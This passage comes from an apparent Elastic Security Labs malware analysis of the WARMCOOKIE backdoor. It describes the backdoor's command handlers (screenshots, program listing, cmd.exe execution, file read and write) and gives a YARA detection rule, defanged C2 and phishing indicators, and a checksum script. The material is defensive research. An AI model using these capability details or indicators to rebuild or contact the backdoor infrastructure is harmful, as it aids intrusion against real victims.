screenshot.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image26.png\",alt:\"Screen capture via BitBlt\",title:\"Screen capture via BitBlt\",width:\"912\",height:\"492\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The collected screenshot is encrypted with RC4 and sent through a POST request along with the checksum data.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image38.png\",alt:\"Decrypted POST Request Data from Handler 3\",title:\"Decrypted POST Request Data from Handler 3\",width:\"641\",height:\"173\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"By looking for the file header \",(0,i.jsx)(e.code,{children:\"JPEG File Interchange Format (JFIF)\"}),\", we can carve out the image, and find a high-quality image of our sandbox machine (below) based on our request to this handler.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image29.jpg\",alt:\"Desktop capture from VM sandbox\",title:\"Desktop capture from VM sandbox\",width:\"1440\",height:\"762\"})}),`\n`,(0,i.jsx)(e.h4,{id:\"retrieve-installed-programs---command-id-3\",children:\"Retrieve installed programs - command ID (3)\"}),`\n`,(0,i.jsx)(e.p,{children:\"This handler enumerates the installed programs on the victim machine via the registry key:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\n`})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image12.png\",alt:\"Grabbing the installed programs from the registry\",title:\"Grabbing the installed programs from the registry\",width:\"976\",height:\"467\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The program's name, version, and installation date are Base64 encoded and placed into a pipe-delimited format along with the checksum data, offsets, and sizing.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image15.png\",alt:\"Decrypted POST Request Data from Handler 3\",title:\"Decrypted POST Request Data from Handler 3\",width:\"613\",height:\"184\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Below is an example of one of the registry entries:\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Encoded Value\"}),(0,i.jsx)(e.th,{children:\"Decoded Value\"})]})}),(0,i.jsx)(e.tbody,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Ny1aaXAgMTguMDEgKHg2NCk=\"}),(0,i.jsx)(e.td,{children:\"7-Zip 18.01 (x64)\"})]})})]})}),`\n`,(0,i.jsx)(e.h4,{id:\"command-line-execution---command-id-4\",children:\"Command-line execution - command ID (4)\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"WARMCOOKIE uses this handler to provide backdoor access to the victim machine. The operator provides an argument that gets executed to \",(0,i.jsx)(e.code,{children:\"cmd.exe /c \"}),\"without a console window.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image37.png\",alt:\"New process creation with custom command line\",title:\"New process creation with custom command line\",width:\"1076\",height:\"205\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"In the example below, \",(0,i.jsx)(e.code,{children:\"whoami\"}),\" is provided as the argument:\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image33.png\",alt:\"Process tree with command-lines\",title:\"Process tree with command-lines\",width:\"812\",height:\"86\"})}),`\n`,(0,i.jsx)(e.p,{children:\"This function reads the output from the provided command and stores it in Base64, where it\\u2019s sent back to the C2 server. Below is an example of the decrypted data for this handler:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image30.png\",alt:\"Decrypted POST Request Data from Handler 4\",title:\"Decrypted POST Request Data from Handler 4\",width:\"650\",height:\"130\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Encoded Value\"}),(0,i.jsx)(e.th,{children:\"Decoded Value\"})]})}),(0,i.jsx)(e.tbody,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"ZGVza3RvcC0yYzNpcWhvXHJlbQ0K\"}),(0,i.jsx)(e.td,{children:\"desktop-2c3iqho\\\\rem\"})]})})]})}),`\n`,(0,i.jsx)(e.h4,{id:\"write-file---command-id-5\",children:\"Write file - command ID (5)\"}),`\n`,(0,i.jsx)(e.p,{children:\"WARMCOOKIE can drop files on the victim machine; the threat actors provide the file path and file data.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image28.png\",alt:\"File Creation within Handler 5\",title:\"File Creation within Handler 5\",width:\"1053\",height:\"277\"})}),`\n`,(0,i.jsx)(e.p,{children:\"As a test, we can write a file within a directory with some data and then read it in the next handler.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image27.png\",alt:\"Custom file creation\",title:\"Custom file creation\",width:\"711\",height:\"68\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image19.png\",alt:\"Data written to custom file\",title:\"Data written to custom file\",width:\"641\",height:\"247\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Depending on the file write result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"OK\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"ERROR: Cannot write file\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image2.png\",alt:\"Decrypted POST Request Data from Handler 5\",title:\"Decrypted POST Request Data from Handler 5\",width:\"647\",height:\"107\"})}),`\n`,(0,i.jsx)(e.h4,{id:\"read-file---command-id-6\",children:\"Read file - command ID (6)\"}),`\n`,(0,i.jsx)(e.p,{children:\"This handler can read file content from machines infected with WARMCOOKIE. The threat actor needs to provide the file path as the argument.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image25.png\",alt:\"Reading files within Handler 6\",title:\"Reading files within Handler 6\",width:\"1067\",height:\"482\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Depending on the file read result, WARMCOOKIE will send out a POST request with one of the following Base64 encoded values along with the file contents:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"OK (See 'Files' tab)\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"ERROR: Cannot read file\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image5.png\",alt:\"Decrypted POST Request Data from Handler 6\",title:\"Decrypted POST Request Data from Handler 6\",width:\"633\",height:\"115\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Based on the previous wording around a \",(0,i.jsx)(e.code,{children:\"Files\"}),\" tab, the WARMCOOKIE operators may use a GUI element.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"remove-persistence---command-id-10\",children:\"Remove persistence - command ID (10)\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"This handler removes the previously configured scheduled task with the name \",(0,i.jsx)(e.code,{children:\"RtlUpd\"}),\". By leveraging COM, it will call \",(0,i.jsx)(e.code,{children:\"DeleteFileW\"}),\" within \",(0,i.jsx)(e.code,{children:\"mstask.dll\"}),\" to remove the task.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image4.png\",alt:\"Callstack showing task deletion via COM\",title:\"Callstack showing task deletion via COM\",width:\"1063\",height:\"328\"})}),`\n`,(0,i.jsx)(e.h2,{id:\"ida-string-decryption-tool\",children:\"IDA string decryption tool\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic Security Labs is releasing an IDAPython script used to decrypt strings from WARMCOOKIE. The decrypted strings will be placed in the IDA Pro decompiler helping analysts identify key functionality. The string decryption and IDA commenting tool can be downloaded \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/labs-releases/tree/main/tools/warmcookie\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,i.jsx)(e.p,{children:\"WARMCOOKIE is a newly discovered backdoor that is gaining popularity and is being used in campaigns targeting users across the globe. Our team believes this malware represents a formidable threat that provides the capability to access target environments and push additional types of malware down to victims. While there is room for improvement on the malware development side, we believe these minor issues will be addressed over time. Elastic Security Labs will continue to monitor this threat and recommends that the industry do the same.\"}),`\n`,(0,i.jsx)(e.h2,{id:\"warmcookie-and-mitre-attck\",children:\"WARMCOOKIE and MITRE ATT\u0026CK\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic uses the \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/\",rel:\"nofollow\",children:\"MITRE ATT\u0026CK\"}),\" framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"tactics\",children:\"Tactics\"}),`\n`,(0,i.jsx)(e.p,{children:\"Tactics represent the why of a technique or sub-technique. It is the adversary\\u2019s tactical goal: the reason for performing an action.\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0001\",rel:\"nofollow\",children:\"Initial Access\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0002/\",rel:\"nofollow\",children:\"Execution\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0005/\",rel:\"nofollow\",children:\"Defense Evasion\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0007\",rel:\"nofollow\",children:\"Discovery\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0011\",rel:\"nofollow\",children:\"Command and Control\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0010/\",rel:\"nofollow\",children:\"Exfiltration\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h3,{id:\"techniques\",children:\"Techniques\"}),`\n`,(0,i.jsx)(e.p,{children:\"Techniques represent how an adversary achieves a tactical goal by performing an action.\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1566/\",rel:\"nofollow\",children:\"Phishing\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1204/001/\",rel:\"nofollow\",children:\"User Execution: Malicious Link\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1059/001/\",rel:\"nofollow\",children:\"Command and Scripting Interpreter: PowerShell\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1082/\",rel:\"nofollow\",children:\"System Information Discovery\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1053/\",rel:\"nofollow\",children:\"Scheduled Task/Job\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1113/\",rel:\"nofollow\",children:\"Screen Capture\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1059/003/\",rel:\"nofollow\",children:\"Command and Scripting Interpreter: Windows Command Shell\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"preventing-and-detecting-warmcookie\",children:\"Preventing and detecting WARMCOOKIE\"}),`\n`,(0,i.jsx)(e.h3,{id:\"prevention\",children:\"Prevention\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_downloads.toml\",rel:\"nofollow\",children:\"Suspicious PowerShell Downloads\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml\",rel:\"nofollow\",children:\"Scheduled Task Creation by an Unusual Process\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/execution_suspicious_powershell_execution.toml\",rel:\"nofollow\",children:\"Suspicious PowerShell Execution via Windows Scripts\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/ecde1dfa1aaeb6ace99e758c2ba7d2e499f93515/behavior/rules/defense_evasion_rundll32_regsvr32_loads_a_dll_downloaded_via_bits.toml\",rel:\"nofollow\",children:\"RunDLL32/Regsvr32 Loads a DLL Downloaded via BITS\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_rundll32_with_unusual_arguments.toml\",rel:\"nofollow\",children:\"RunDLL32 with Unusual Arguments\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar\",rel:\"nofollow\",children:\"Windows.Trojan.WarmCookie\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h3,{id:\"detection-wyara\",children:\"Detection w/YARA\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic Security has created YARA rules to identify this activity. Below are YARA rules to identify \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_WarmCookie.yar\",rel:\"nofollow\",children:\"WARMCOOKIE\"}),\":\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-yara\",children:`rule Windows_Trojan_WarmCookie_7d32fa90 {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-04-29\"\n        last_modified = \"2024-05-08\"\n        os = \"Windows\"\n        arch = \"x86\"\n        threat_name = \"Windows.Trojan.WarmCookie\"\n        license = \"Elastic License v2\"\n\n     strings:\n        $seq_checksum = { 45 8D 5D ?? 45 33 C0 41 83 E3 ?? 49 8D 4E ?? 44 03 DB 41 8D 53 ?? }\n        $seq_string_decrypt = { 8B 69 04 48 8D 79 08 8B 31 89 6C 24 ?? 48 8D 4E ?? E8 }\n        $seq_filesearch = { 48 81 EC 58 02 00 00 48 8B 05 82 0A 02 00 48 33 C4 48 89 84 24 40 02 00 00 45 33 C9 48 8D 44 24 30 45 33 C0 48 89 44 24 20 33 C9 41 8D 51 1A FF 15 83 4D 01 00 85 C0 78 22 48 8D 4C 24 30 E8 1D }\n        $seq_registry = { 48 81 EC 80 02 00 00 48 8B 05 F7 09 02 00 48 33 C4 48 89 84 24 70 02 00 00 4C 89 B4 24 98 02 00 00 48 8D 0D 4D CA 01 00 45 33 F6 41 8B FE E8 02 4F 00 00 48 8B E8 41 B9 08 01 00 00 48 8D 44 24 }\n        $plain_str1 = \"release.dll\" ascii fullword\n        $plain_str2 = \"\\\\\"Main Invoked.\\\\\"\" ascii fullword\n        $plain_str3 = \"\\\\\"Main Returned.\\\\\"\" ascii fullword\n        $decrypt_str1 = \"ERROR: Cannot write file\" wide fullword\n        $decrypt_str2 = \"OK (No output data)\" wide fullword\n        $decrypt_str3 = \"OK (See 'Files' tab)\" wide fullword\n        $decrypt_str4 = \"cmd.exe /c %ls\" wide fullword\n        $decrypt_str5 = \"Cookie:\" wide fullword\n        $decrypt_str6 = \"%ls\\\\\\\\*.*\" wide fullword\n    condition:\n        (3 of ($plain*)) or (2 of ($seq*)) or 4 of ($decrypt*)\n}\n`})}),`\n`,(0,i.jsx)(e.h2,{id:\"observations\",children:\"Observations\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"All observables are also available for \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/labs-releases/tree/main/indicators/warmcookie\",rel:\"nofollow\",children:\"download\"}),\" in both ECS and STIX format.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"The following observables were discussed in this research.\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Observable\"}),(0,i.jsx)(e.th,{children:\"Type\"}),(0,i.jsx)(e.th,{children:\"Name\"}),(0,i.jsx)(e.th,{children:\"Reference\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"ccde1ded028948f5cd3277d2d4af6b22fa33f53abde84ea2aa01f1872fad1d13\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:\"RtlUpd.dll\"}),(0,i.jsx)(e.td,{children:\"WARMCOOKIE\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"omeindia[.]com\"})}),(0,i.jsx)(e.td,{children:\"domain\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"Phishing link\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"assets.work-for[.]top\"})}),(0,i.jsx)(e.td,{children:\"domain\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"Landing page\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"45.9.74[.]135\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"Landing page\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"80.66.88[.]146\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"WARMCOOKIE C2 server\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"185.49.69[.]41\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"WARMCOOKIE C2 server\"})]})]})]})}),`\n`,(0,i.jsx)(e.h2,{id:\"references\",children:\"References\"}),`\n`,(0,i.jsx)(e.p,{children:\"The following were referenced throughout the above research:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign\",rel:\"nofollow\",children:\"https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://x.com/Cryptolaemus1/status/1785423804577034362\",rel:\"nofollow\",children:\"https://x.com/Cryptolaemus1/status/1785423804577034362\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"appendix\",children:\"Appendix\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:\"Checksum example\"})}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-python\",children:`def calculate_checksum(str_input, str_len, i):\n    if i == 0:\n        i = 0xFFFFFFFF\n    if i == -1:\n        i = 0\n\n    for idx in range(0, str_len, 2):\n        v6 = str_input[idx] | (str_input[idx + 1] \u003c\u003c 8)\n        for _ in range(16):\n            if (v6 ^ i) \u0026 1:\n                i = ((i \u003e\u003e 1) ^ 0xEDB88320) \u0026 0xFFFFFFFF\n            else:\n                i = (i \u003e\u003e 1) \u0026 0xFFFFFFFF\n            v6 \u003e\u003e= 1\n\n    return ~i \u0026 0xFFFFFFFF\n\n\nserial_volume = 0x0A2C9AD2F\n\nmutex = \"f92e6f3c-9cc3-4be0-966c-1be421e69140\".encode(\"utf-16le\")\nmutex_result = calculate_checksum(mutex, len(mutex), -1)\n\nusername = \"REM\\\\x00\".encode(\"utf-16le\")\nusername_result = calculate_checksum(username, len(username), -1)\n\ncomputer_name = \"DESKTOP-2C3IQHO\".encode(\"utf-16le\")\ncomputer_name_result = calculate_checksum(computer_name, len(computer_name), -1)\n\nprint(f\"Mutex: {hex(mutex_result)}\")\nprint(f\"Username: {hex(username_result)}\")\nprint(f\"Computer Name: {hex(computer_name_result)}\")\nprint(f\"#1 Checksum: {hex(serial_volume ^ mutex_result)}\")\nprint(f\"#2 Checksum: {hex(username_result ^ computer_name_result)}\")\n`})})]})}function C(n={}){let{wrapper:e}=n.components||{};return e?(0,i.jsx)(e,Object.assign({},n,{children:(0,i.jsx)(c,n)})):c(n)}var k=C;return b(T);})();\n;return Component;"},"_id":"articles/dipping-into-danger.mdx","_raw":{"sourceFilePath":"articles/dipping-into-danger.mdx","sourceFileName":"dipping-into-danger.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/dipping-into-danger"},"type":"Article","imageUrl":"/assets/images/dipping-into-danger/warmcookie.jpg","readingTime":"27 min read","series":"","url":"/dipping-into-danger","headings":[{"level":2,"title":"WARMCOOKIE at a glance","href":"#warmcookie-at-a-glance"},{"level":2,"title":"Key takeaways","href":"#key-takeaways"},{"level":2,"title":"REF6127 campaign overview","href":"#ref6127-campaign-overview"},{"level":3,"title":"REF6127 infrastructure overview","href":"#ref6127-infrastructure-overview"},{"level":2,"title":"WARMCOOKIE malware anlaysis","href":"#warmcookie-malware-anlaysis"},{"level":3,"title":"Stage 1","href":"#stage-1"},{"level":4,"title":"Persistence","href":"#persistence"},{"level":3,"title":"Stage 2","href":"#stage-2"},{"level":4,"title":"Obfuscation ","href":"#obfuscation-"},{"level":4,"title":"Dynamic API loading","href":"#dynamic-api-loading"},{"level":4,"title":"Anti-debugging","href":"#anti-debugging"},{"level":4,"title":"Mutex","href":"#mutex"},{"level":4,"title":"Execution","href":"#execution"},{"level":4,"title":"Communication","href":"#communication"},{"level":3,"title":"Bot functionality","href":"#bot-functionality"},{"level":4,"title":"Retrieve victim details - command ID (1)","href":"#retrieve-victim-details---command-id-1"},{"level":4,"title":"Screenshot capture - command ID (2)","href":"#screenshot-capture---command-id-2"},{"level":4,"title":"Retrieve installed programs - command ID (3)","href":"#retrieve-installed-programs---command-id-3"},{"level":4,"title":"Command-line execution - command ID (4)","href":"#command-line-execution---command-id-4"},{"level":4,"title":"Write file - command ID (5)","href":"#write-file---command-id-5"},{"level":4,"title":"Read file - command ID (6)","href":"#read-file---command-id-6"},{"level":4,"title":"Remove persistence - command ID (10)","href":"#remove-persistence---command-id-10"},{"level":2,"title":"IDA string decryption tool","href":"#ida-string-decryption-tool"},{"level":2,"title":"Conclusion","href":"#conclusion"},{"level":2,"title":"WARMCOOKIE and MITRE ATT\u0026CK","href":"#warmcookie-and-mitre-attck"},{"level":3,"title":"Tactics","href":"#tactics"},{"level":3,"title":"Techniques","href":"#techniques"},{"level":2,"title":"Preventing and detecting WARMCOOKIE","href":"#preventing-and-detecting-warmcookie"},{"level":3,"title":"Prevention","href":"#prevention"},{"level":3,"title":"Detection w/YARA","href":"#detection-wyara"},{"level":2,"title":"Observations","href":"#observations"},{"level":2,"title":"References","href":"#references"},{"level":2,"title":"Appendix","href":"#appendix"}],"author":[{"title":"Daniel Stepanic","slug":"daniel-stepanic","description":"Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var i=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var _=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),g=(t,n)=\u003e{for(var e in n)i(t,e,{get:n[e],enumerable:!0})},s=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let a of p(n))!f.call(t,a)\u0026\u0026a!==e\u0026\u0026i(t,a,{get:()=\u003en[a],enumerable:!(o=x(n,a))||o.enumerable});return t};var j=(t,n,e)=\u003e(e=t!=null?m(d(t)):{},s(n||!t||!t.__esModule?i(e,\"default\",{value:t,enumerable:!0}):e,t)),D=t=\u003es(i({},\"__esModule\",{value:!0}),t);var u=_((h,c)=\u003e{c.exports=_jsx_runtime});var X={};g(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=j(u()),M={title:\"Daniel Stepanic\",description:\"Elastic\",slug:\"daniel-stepanic\"};function l(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(l,t)})):l(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"authors/daniel-stepanic.mdx","_raw":{"sourceFilePath":"authors/daniel-stepanic.mdx","sourceFileName":"daniel-stepanic.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/daniel-stepanic"},"type":"Author","imageUrl":"","url":"/authors/daniel-stepanic"}],"category":[{"title":"Malware analysis","slug":"malware-analysis","body":{"raw":"","code":"var Component=(()=\u003e{var u=Object.create;var s=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),M=(t,n)=\u003e{for(var e in n)s(t,e,{get:n[e],enumerable:!0})},i=(t,n,e,o)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let r of f(n))!g.call(t,r)\u0026\u0026r!==e\u0026\u0026s(t,r,{get:()=\u003en[r],enumerable:!(o=x(n,r))||o.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?u(_(t)):{},i(n||!t||!t.__esModule?s(e,\"default\",{value:t,enumerable:!0}):e,t)),p=t=\u003ei(s({},\"__esModule\",{value:!0}),t);var l=j((X,c)=\u003e{c.exports=_jsx_runtime});var D={};M(D,{default:()=\u003eC,frontmatter:()=\u003ew});var a=d(l()),w={title:\"Malware analysis\",slug:\"malware-analysis\"};function m(t){return(0,a.jsx)(a.Fragment,{})}function y(t={}){let{wrapper:n}=t.components||{};return n?(0,a.jsx)(n,Object.assign({},t,{children:(0,a.jsx)(m,t)})):m(t)}var C=y;return p(D);})();\n;return Component;"},"_id":"categories/malware-analysis.mdx","_raw":{"sourceFilePath":"categories/malware-analysis.mdx","sourceFileName":"malware-analysis.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/malware-analysis"},"type":"Category","url":"/categories/malware-analysis"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"dipping-into-danger"},"buildId":"dGrrQfBbQkqaleQ_11aBK","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>